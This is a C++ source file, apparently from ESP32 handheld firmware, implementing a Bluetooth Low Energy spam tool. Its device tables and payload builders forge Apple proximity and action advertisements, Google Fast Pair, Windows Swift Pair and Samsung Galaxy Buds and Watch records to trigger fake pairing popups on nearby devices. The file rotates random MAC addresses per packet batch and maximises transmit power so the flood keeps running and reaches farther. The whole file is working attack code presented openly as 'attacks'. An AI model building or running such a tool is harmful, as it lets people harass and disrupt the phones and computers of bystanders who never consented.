#include "utils/ble/BleSpamUtil.h"
#include <esp_system.h>
#include <string.h>

// Chip-specific advertising TX-power ceiling.
// Most unigeek boards are ESP32-S3 (cardputer_adv, cores3, sticks3, tembed_cc1101,
// tdisplay_s3, tlora_pager, reaper…) and can reach +21 dBm; the classic ESP32
// boards (cyd*, tdisplay, stickcplus*) top out at +9 dBm. Capping everything at
// P9 (the previous behaviour) left the S3 boards advertising ~12 dB weaker than
// they can, which reads as "spam barely reaches nearby phones".
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P9
#endif

// NimBLE internal API to set the static-random advertising address.
extern "C" int ble_hs_id_set_rnd(const uint8_t* addr);

// ── Static settings ──────────────────────────────────────────────────────────
BleSpamUtil::TxPower  BleSpamUtil::txPower = BleSpamUtil::TX_MAX;
BleSpamUtil::MacRand  BleSpamUtil::macRand = BleSpamUtil::MAC_3;   // default: every 3
uint32_t              BleSpamUtil::advMs   = 15;                   // default
uint32_t              BleSpamUtil::gapMs   = 5;                    // default
char                  BleSpamUtil::customName[32] = {0};

// ── Device tables ────────────────────────────────────────────────────────────

namespace {

struct AppleDev  { const char* name; uint16_t id; };
struct AppleAct  { const char* name; uint8_t flags; uint8_t action; };

const AppleDev kAppleProximity[] = {
  {"AirPods Pro", 0x0E20}, {"AirPods Pro 2", 0x1420}, {"AirPods Pro 2 USB-C", 0x2420},
  {"AirPods 4 ANC", 0x2820}, {"AirPods 4", 0x2920}, {"AirPods Max USB-C", 0x2B20},
  {"AirPods Max", 0x0A20}, {"AirPods", 0x0220}, {"AirPods 2", 0x0F20}, {"AirPods 3", 0x1320},
  {"Powerbeats 3", 0x0320}, {"Powerbeats Pro", 0x0B20}, {"Beats Solo Pro", 0x0C20},
  {"Beats Studio Buds", 0x1120}, {"Beats Flex", 0x1020}, {"Beats X", 0x0520},
  {"Beats Solo 3", 0x0620}, {"Beats Studio 3", 0x0920}, {"Beats Studio Pro", 0x1720},
  {"Beats Fit Pro", 0x1220}, {"Beats Studio Buds+", 0x1620}, {"Beats Solo 4", 0x2520},
  {"Beats Solo Buds", 0x2620}, {"Powerbeats Pro 2", 0x2C20}, {"AirTag", 0x0055},
  {"Hermes AirTag", 0x0030}, {"Powerbeats Fit", 0x2F20},
};
const int kAppleProximityCount = sizeof(kAppleProximity) / sizeof(kAppleProximity[0]);

const AppleAct kAppleActions[] = {
  {"AppleTV AutoFill", 0xC0, 0x13}, {"AppleTV Connecting", 0xC0, 0x27},
  {"Join This AppleTV", 0xC0, 0x20}, {"AppleTV Audio Sync", 0xC0, 0x19},
  {"TV Color Balance", 0xC0, 0x1E}, {"Setup New iPhone", 0xC0, 0x09},
  {"Transfer Number", 0xC0, 0x02}, {"HomePod Setup", 0xC0, 0x0B},
  {"Setup New AppleTV", 0xC0, 0x01}, {"Pair AppleTV", 0xC0, 0x06},
  {"HomeKit AppleTV", 0xC0, 0x0D}, {"AppleID for AppleTV", 0xC0, 0x2B},
  {"Apple Watch", 0xC0, 0x05}, {"Apple Vision Pro", 0xC0, 0x24},
  {"Connect to Device", 0xC0, 0x2F}, {"Software Update", 0x40, 0x21},
  {"Unlock w/ Watch", 0xC0, 0x2E}, {"AirDrop Sidecar", 0xC0, 0x25},
  {"Vision Pro Setup", 0xC0, 0x2C},
};
const int kAppleActionCount = sizeof(kAppleActions) / sizeof(kAppleActions[0]);

// Google Fast Pair 3-byte model IDs (New device nearby popup).
const uint32_t kAndroidModels[] = {
  0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007, 0x090000,
  0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
  0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4, 0x0002F0,
  0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886,
};
const int kAndroidModelCount = sizeof(kAndroidModels) / sizeof(kAndroidModels[0]);
const char* const kAndroidDevs[] = {"Pixel Fast Pair", "Generic Alert"};

// Samsung Galaxy Watch model bytes.
const uint8_t kSamsungWatch[] = {
  0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C,
  0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20,
};
const int kSamsungWatchCount = sizeof(kSamsungWatch) / sizeof(kSamsungWatch[0]);
// Samsung Galaxy Buds 3-byte color codes.
const uint32_t kSamsungBuds[] = {
  0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C,
  0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740,
};
const int kSamsungBudsCount = sizeof(kSamsungBuds) / sizeof(kSamsungBuds[0]);
const char* const kSamsungDevs[] = {"Galaxy Buds", "Galaxy Watch", "Generic Samsung"};

const char* const kWindowsPresets[] = {
  "Generic Swift Pair", "Never Gonna Give U Up", "Bill Nye's iPhone",
  "Skibidi Toilet", "67", "FBI Surveillance Van",
};
const int kWindowsPresetCount = sizeof(kWindowsPresets) / sizeof(kWindowsPresets[0]);

const char* const kBeaconPresets[] = {
  "NeverGonnaGiveYoUp", "Bill Nye's iPhone", "Skibidi Toilet", "67", "FBISurveillanceVan",
};
const int kBeaconPresetCount = sizeof(kBeaconPresets) / sizeof(kBeaconPresets[0]);

const char* const kAttackLabels[] = {
  "Apple Pairing", "Apple Action", "Apple Not-Your-Device",
  "Android (Fast Pair)", "Windows Swift Pair", "Samsung", "BLE Beacon", "Random / All",
};

const char kNameChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const int  kNameCharsLen = sizeof(kNameChars) - 1;

void randomName(char* buf, int len) {
  for (int i = 0; i < len; i++) buf[i] = kNameChars[random(0, kNameCharsLen)];
  buf[len] = '\0';
}

esp_power_level_t txLevel(BleSpamUtil::TxPower p) {
  switch (p) {
    case BleSpamUtil::TX_MAX:    return BLE_SPAM_MAX_TX_POWER;
    case BleSpamUtil::TX_HIGH:   return ESP_PWR_LVL_P9;
    case BleSpamUtil::TX_MEDIUM: return ESP_PWR_LVL_P6;
    case BleSpamUtil::TX_LOW:    return ESP_PWR_LVL_P3;
    default:                     return BLE_SPAM_MAX_TX_POWER;
  }
}

uint32_t macDivisor(BleSpamUtil::MacRand m) {
  switch (m) {
    case BleSpamUtil::MAC_1:  return 1;
    case BleSpamUtil::MAC_2:  return 2;
    case BleSpamUtil::MAC_3:  return 3;
    case BleSpamUtil::MAC_5:  return 5;
    case BleSpamUtil::MAC_10: return 10;
    case BleSpamUtil::MAC_25: return 25;
    case BleSpamUtil::MAC_50: return 50;
    default:                  return 0;
  }
}

}  // namespace

// ── Labels / counts ──────────────────────────────────────────────────────────

const char* BleSpamUtil::attackLabel(int a) {
  if (a < 0 || a >= ATTACK_COUNT) return "?";
  return kAttackLabels[a];
}

int BleSpamUtil::deviceCount(int a) {
  switch (a) {
    case APPLE_PAIRING:
    case APPLE_NYD:   return kAppleProximityCount;
    case APPLE_ACTION:return kAppleActionCount;
    case ANDROID:     return 2;
    case WINDOWS:     return kWindowsPresetCount;
    case SAMSUNG:     return 3;
    case BEACON:      return kBeaconPresetCount;
    default:          return 0;
  }
}

const char* BleSpamUtil::deviceLabel(int a, int idx) {
  switch (a) {
    case APPLE_PAIRING:
    case APPLE_NYD:   return kAppleProximity[idx].name;
    case APPLE_ACTION:return kAppleActions[idx].name;
    case ANDROID:     return kAndroidDevs[idx];
    case WINDOWS:     return kWindowsPresets[idx];
    case SAMSUNG:     return kSamsungDevs[idx];
    case BEACON:      return kBeaconPresets[idx];
    default:          return "?";
  }
}

const char* BleSpamUtil::txLabel(int p) {
  switch (p) { case TX_MAX: return "MAX"; case TX_HIGH: return "HIGH";
               case TX_MEDIUM: return "MEDIUM"; case TX_LOW: return "LOW"; default: return "MAX"; }
}

const char* BleSpamUtil::macLabel(int m) {
  switch (m) {
    case MAC_OFF: return "Off";  case MAC_1: return "Every Packet";
    case MAC_2: return "Every 2"; case MAC_3: return "Every 3"; case MAC_5: return "Every 5";
    case MAC_10: return "Every 10"; case MAC_25: return "Every 25"; case MAC_50: return "Every 50";
    default: return "Every Packet";
  }
}

// ── Lifecycle ────────────────────────────────────────────────────────────────

void BleSpamUtil::begin(Attack attack, int deviceIndex)
{
  _attack      = attack;
  _deviceIndex = deviceIndex;
  _packets     = 0;
  _macInit     = false;

  NimBLEDevice::init("");
  _applyTxPower();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  _pAdv = NimBLEDevice::getAdvertising();
  _pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);  // ADV_IND (connectable)
  _pAdv->setMinInterval(0x20);
  _pAdv->setMaxInterval(0x30);
  _pAdv->setScanResponse(false);

  _started    = true;
  _nextSendMs = millis();   // first tick() sends immediately
  tick();
}

void BleSpamUtil::end()
{
  if (!_started) return;   // idempotent — guards double deinit (crash on exit)
  _started = false;
  if (_pAdv) { _pAdv->stop(); _pAdv = nullptr; }
  NimBLEDevice::deinit(true);
}

void BleSpamUtil::_applyTxPower()
{
  esp_power_level_t lvl = txLevel(txPower);
  NimBLEDevice::setPower(lvl, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::setPower(lvl, ESP_BLE_PWR_TYPE_DEFAULT);
}

bool BleSpamUtil::_shouldRotateMac() const
{
  if (macRand == MAC_OFF) return !_macInit;
  uint32_t div = macDivisor(macRand);
  if (div == 0) return false;
  return !_macInit || (_packets % div) == 0;
}

// Swap the advertising address at the interface + host level without tearing
// down the stack. This is what lets the spam run indefinitely instead of dying
// after a few packets.
void BleSpamUtil::_rotateMacInterface()
{
  uint8_t mac[6];
  esp_fill_random(mac, 6);

  if (_pAdv) _pAdv->stop();

  // Advertising address for NimBLE comes from the host random-static address.
  // A valid static random address needs the two MSBs of the MSB byte set to 11.
  mac[5] |= 0xC0;
  ble_hs_id_set_rnd(mac);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  _macInit = true;
}

// Send tick: called every loop iteration. Every (advMs + gapMs) it swaps in a
// fresh payload (and a new MAC every N packets), but the advertiser is left
// RUNNING between refreshes.
//
// Why not stop-then-restart per packet: legacy connectable advertising (ADV_IND)
// has a 20 ms hardware minimum interval. Advertising for a 15 ms window and then
// stopping tears the advertiser down before the controller emits a single
// advertising event — MACs rotate and the packet counter climbs, but nothing
// ever goes on air (which is exactly the "spins but no popups" symptom). Keeping
// the advertiser continuously active — the way the earlier working spam screens
// did — guarantees packets are transmitted. We only pause for the sub-millisecond
// data/MAC swap.
void BleSpamUtil::tick()
{
  if (!_started || !_pAdv) return;
  uint32_t now = millis();
  if (now < _nextSendMs) return;  // advertiser keeps running until the next refresh

  Attack a  = _attack;
  int    di = _deviceIndex;
  if (a == RANDOM_ALL) {
    a  = (Attack)random(0, BEACON + 1);  // any concrete attack
    di = -1;
  }

  NimBLEAdvertisementData d;
  if (!_build(a, di, d)) {
    _nextSendMs = now + gapMs;  // build failed — retry shortly
    return;
  }

  if (_shouldRotateMac()) {
    _rotateMacInterface();  // stops the advertiser and programs a new random addr
  } else {
    _pAdv->stop();          // brief stop so the new payload is picked up cleanly
  }
  _pAdv->setAdvertisementData(d);
  _pAdv->start();

  _packets++;
  _nextSendMs = now + advMs + gapMs;
}

// ── Payload builders (NimBLE 1.4) ────────────────────────────────────────────

bool BleSpamUtil::_build(Attack attack, int deviceIndex, NimBLEAdvertisementData& out)
{
  switch (attack) {
    case APPLE_PAIRING:
    case APPLE_NYD: {
      int idx = (deviceIndex >= 0 && deviceIndex < kAppleProximityCount)
                  ? deviceIndex : random(kAppleProximityCount);
      uint16_t dev = kAppleProximity[idx].id;
      uint8_t prefix = (attack == APPLE_NYD) ? 0x01 : 0x07;
      uint8_t rnd[19]; esp_fill_random(rnd, sizeof(rnd));
      uint8_t mfg[29] = {
        0x4C, 0x00, 0x07, 0x19, prefix,
        (uint8_t)(dev >> 8), (uint8_t)(dev & 0xFF), 0x55,
        rnd[0], rnd[1], rnd[2], 0x00, 0x00,
        rnd[3], rnd[4], rnd[5], rnd[6], rnd[7], rnd[8], rnd[9], rnd[10],
        rnd[11], rnd[12], rnd[13], rnd[14], rnd[15], rnd[16], rnd[17], rnd[18],
      };
      // No setFlags(): this manufacturer record is already the full 31-byte PDU.
      // Adding a 3-byte Flags AD overflows BLE_HS_ADV_MAX_SZ and NimBLE then
      // silently drops the Apple payload (advertises flags only → no popup).
      out.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
      return true;
    }
    case APPLE_ACTION: {
      int idx = (deviceIndex >= 0 && deviceIndex < kAppleActionCount)
                  ? deviceIndex : random(kAppleActionCount);
      uint8_t rnd[3]; esp_fill_random(rnd, 3);
      uint8_t mfg[9] = {
        0x4C, 0x00, 0x0F, 0x05,
        kAppleActions[idx].flags, kAppleActions[idx].action,
        rnd[0], rnd[1], rnd[2],
      };
      out.setFlags(0x06);
      out.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
      return true;
    }
    case ANDROID: {
      uint32_t model;
      if (deviceIndex == 0)      model = 0x00000A;              // Pixel-style
      else if (deviceIndex == 1) model = 0x000047;              // Generic alert
      else                       model = kAndroidModels[random(kAndroidModelCount)];
      int8_t tx = (int8_t)(random(120) - 100);
      uint8_t raw[14] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)((model >> 16) & 0xFF), (uint8_t)((model >> 8) & 0xFF), (uint8_t)(model & 0xFF),
        0x02, 0x0A, (uint8_t)tx,
      };
      out.setFlags(0x06);
      out.addData(std::string((char*)raw, sizeof(raw)));
      return true;
    }
    case WINDOWS: {
      char nameBuf[16];
      const char* name;
      if (customName[0] != '\0') name = customName;
      else if (deviceIndex >= 0 && deviceIndex < kWindowsPresetCount) name = kWindowsPresets[deviceIndex];
      else name = kWindowsPresets[random(kWindowsPresetCount)];
      (void)nameBuf;

      int len = (int)strnlen(name, 24);
      uint8_t mfg[5 + 24];
      mfg[0] = 0x06; mfg[1] = 0x00; mfg[2] = 0x03; mfg[3] = 0x00; mfg[4] = 0x80;
      memcpy(&mfg[5], name, len);
      // No setFlags(): keep the whole 31-byte PDU free for the name (Swift Pair
      // doesn't need a Flags AD).
      out.setManufacturerData(std::string((char*)mfg, 5 + len));
      return true;
    }
    case SAMSUNG: {
      int sel = (deviceIndex >= 0 && deviceIndex <= 2) ? deviceIndex : random(3);
      if (sel == 0) {  // Galaxy Buds — two-record manufacturer payload
        uint32_t model = kSamsungBuds[random(kSamsungBudsCount)];
        uint8_t d[31]; uint8_t i = 0;
        d[i++] = 27; d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00; d[i++] = 0x42;
        d[i++] = 0x09; d[i++] = 0x81; d[i++] = 0x02; d[i++] = 0x14; d[i++] = 0x15;
        d[i++] = 0x03; d[i++] = 0x21; d[i++] = 0x01; d[i++] = 0x09;
        d[i++] = (model >> 16) & 0xFF; d[i++] = (model >> 8) & 0xFF; d[i++] = 0x01;
        d[i++] = model & 0xFF; d[i++] = 0x06; d[i++] = 0x3C; d[i++] = 0x94; d[i++] = 0x8E;
        d[i++] = 0x00; d[i++] = 0x00; d[i++] = 0x00; d[i++] = 0x00; d[i++] = 0xC7; d[i++] = 0x00;
        d[i++] = 0x10; d[i++] = 0xFF; d[i++] = 0x75;
        // No setFlags(): 31-byte record already fills the PDU (see Apple note).
        out.addData(std::string((char*)d, i));
        return true;
      }
      // Galaxy Watch / Generic — single manufacturer record
      uint8_t model = (sel == 2) ? 0x1A : kSamsungWatch[random(kSamsungWatchCount)];
      uint8_t mfg[13] = { 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
                          0xFF, 0x00, 0x00, 0x43, model };
      out.setFlags(0x06);
      out.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
      return true;
    }
    case BEACON: {
      char nameBuf[16];
      const char* name;
      if (customName[0] != '\0') name = customName;
      else if (deviceIndex >= 0 && deviceIndex < kBeaconPresetCount) name = kBeaconPresets[deviceIndex];
      else { randomName(nameBuf, 12); name = nameBuf; }
      out.setFlags(0x06);
      out.setName(name);
      return true;
    }
    default:
      return false;
  }
}
